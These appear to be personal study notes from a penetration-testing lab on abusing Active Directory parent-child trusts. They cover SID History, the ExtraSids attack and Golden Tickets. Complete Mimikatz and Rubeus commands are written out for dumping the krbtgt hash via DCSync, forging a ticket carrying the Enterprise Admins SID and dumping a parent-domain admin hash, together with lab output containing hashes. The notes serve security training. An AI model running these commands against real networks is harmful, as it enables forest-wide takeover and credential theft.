
```python
                     [ Parent Domain: company.com ]
                               ▲
                               │  (One-Way Trust)
                               ▼
                [ Child Domain: child.company.com ]


```

🖥️ Network Topology of Parent & Child Domains
```yaml
                 🌍 External Network (Internet)
                            │
                            ▼
                🌐 [ Firewall / Perimeter Router ]
                            │
                            ▼
               ┌───────────────────────────────┐
               │  🏢 Parent Domain: company.com │ (Root Domain)
               │  🌍 IP: 192.168.1.0/24                       │
               └───────────▲───────────┬───────┘
                           │           │
         ┌────────────────┘           └────────────────┐
         ▼                                                                              ▼
  ┌──────────────────────────┐              ┌──────────────────────────┐
  │ 🌎 Child Domain: child.company.com │    │ 🌎 Child Domain: sales.company.com │
  │ 🏢 DC: child-DC1                  │    │ 🏢 DC: sales-DC1                  │
  │ 📌 IP: 192.168.2.0/24              │    │ 📌 IP: 192.168.3.0/24              │
  └──────────────────────────┘        └──────────────────────────┘

```


## SID History Primer

>`If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain`
**Modify SID History** (if they have AD write privileges).

The **SID History** attribute:
>`stores old SIDs when accounts are migrated between domains.`

. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

#### **How Does It Work?**

1. **Understanding the Trust Model:**
    
    - In an **Active Directory (AD) forest**, child domains trust the parent domain.
    - A special **Enterprise Admins** group in the **parent domain** controls the entire forest.
    - Normally, **SID Filtering** (a security measure) would block cross-domain privilege abuse, but **it is not enforced within the same forest**.
2. **What the Attacker Does:**
    
    - First, they **compromise a child domain** (gain admin access to an account).
    - Using **Mimikatz**, they modify the **ExtraSIDs** field in a **forged Kerberos ticket** (Golden Ticket).
    - They inject the **SID of the Enterprise Admins group** from the parent domain.
    - When they authenticate, AD **treats them as an Enterprise Admin**, granting full control over the **parent domain** and **entire forest**.

#### **Why Does This Work?**

- Since **SID Filtering** is not enabled inside the same AD forest, the **parent domain trusts the child's authentication request**.
- This means the **fake SID in the ticket** is **respected**, and the attacker gains **Enterprise Admin privileges**.

#### **What’s the Impact?**

- **Full control over the Active Directory forest**.
- Can create new admin users, dump credentials, move laterally, and establish long-term persistence

----
- The **Enterprise Admins** group (which controls the entire forest) exists **only in the parent domain**.
- Normally, a **child domain admin cannot promote themselves** to Enterprise Admin.
- However, **SID filtering is NOT applied inside the same forest**, which allows us to trick Active Directory into thinking we are Enterprise Admins.

**2️⃣ What is ExtraSIDs in Mimikatz?**
When a user logs into Active Directory, their Kerberos ticket contains **SIDs** that determine their **permissions**.

- The **ExtraSIDs field** in a Kerberos ticket is an optional section that can store **additional SIDs**.
- If we inject the **SID of the Enterprise Admins group** into this field, Active Directory will **trust** that we are part of that group, even if we are not.

Extract the Parent Domain's Enterprise Admin SID
list **SIDs of trusted domains**, including the **Enterprise Admins group**.
Now, you create a **Golden Ticket** but add the **Enterprise Admins SID** to the ExtraSIDs field


```bash
`mimikatz "kerberos::golden /user:fakeuser /domain:child.domain.com /sid:S-1-5-21-XXXXX /krbtgt:krbtgt_hash /sids:S-1-5-21-PARENTDOMAIN-ENTERPRISEADMINS /ptt"`
```
- `/user:fakeuser` → The forged account name.
- `/domain:child.domain.com` → The child domain we control.
- `/sid:S-1-5-21-XXXXX` → The child domain’s **SID**.
- `/krbtgt:krbtgt_hash` → The **NTLM hash** of the child domain’s **krbtgt account**.
- `/sids:S-1-5-21-PARENTDOMAIN-ENTERPRISEADMINS` → The **Enterprise Admins SID from the parent domain**.
- `/ptt` → **Injects the ticket directly** into memory.

🔹 **Step 4: Use the Forged Ticket to Gain Enterprise Admin Access**


## Golden Ticket Attack
A **Golden Ticket** is a **forged Kerberos Ticket-Granting Ticket (TGT)** that allows an attacker to authenticate as **any user** in Active Directory **without needing their password**. It provides **full domain control** and **persistence**, because **TGTs are issued by the domain’s krbtgt account**, which is trusted by all domain controllers.

#### **2️⃣ What’s Needed to Create a Golden Ticket?**

To forge a **Golden Ticket**, you need:

✅ **Domain SID** → The Security Identifier (SID) of the domain.  
✅ **krbtgt NTLM hash** → The NTLM hash of the **krbtgt account**, which signs all TGTs in the domain.  
✅ **Domain name** → The full Active Directory domain name.  
✅ **User account name** → The account you want to impersonate (e.g., `Administrator`).It can be **ANY user**, even a **non-existent user**.



in mimikatz:
```
`/ptt` → **Injects the Golden Ticket into memory immediately**.
```

When you use the `/ptt` flag in **Mimikatz**, the **Golden Ticket** is injected directly into the current session's memory.

💡 **What This Means:**

- **No need to manually export/import the ticket** every time.
- **No need to enter credentials**—Windows automatically uses the injected ticket for authentication.
- **Any action from that session (command prompt, RDP, SMB, etc.) will automatically use the forged TGT.**

---
## ExtraSids Attack - Mimikatz


To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

---

Now we can gather each piece of data required to perform the ExtraSids attack. First, we need to obtain the NT hash for the [KRBTGT](https://adsecurity.org/?p=483) account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account, which should be done periodically and definitely after a penetration test assessment where full domain compromise is reached.


Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.
#### Obtaining the KRBTGT Account's NT Hash using Mimikatz
```powershell
PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

```powershell
SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 11:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e
```

#### Using Get-DomainSID
```powershell
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```


#### Obtaining Enterprise Admins Group's SID using Get-DomainGroup
```powershell
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid                                    
-----------------                                       ---------                                    
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```
>`We could also do this with the [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) cmdlet with a command such as `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`.


#### Creating a Golden Ticket with Mimikatz
```powershell
PS C:\htb> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

We can confirm that the Kerberos ticket for the non-existent hacker user is residing in memory.

#### Confirming a Kerberos Ticket is in Memory Using klist
```powershell-session
PS C:\htb> klist
```
```powershell-session
Cached Tickets: (1)
```

From here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.


#### Listing the Entire C: Drive of the Domain Controller

```powershell-session
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
```
Set-Location \\academy-ea-dc01.inlanefreight.local\C$


-------

## ExtraSids Attack - Rubeus

#### Using ls to Confirm No Access Before Running Rubeus
```powershell-session
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
```

#### Creating a Golden Ticket using Rubeus
```powershell
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
`klist`
performing a DCSync attack against the parent domain, targeting the `lab_adm` Domain Admin user.

#### Performing a DCSync Attack
```powershell
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```

When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:
```powershell-session
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```
```powershell-session
663715a1a8b957e8e9943cc98ea451b6
```

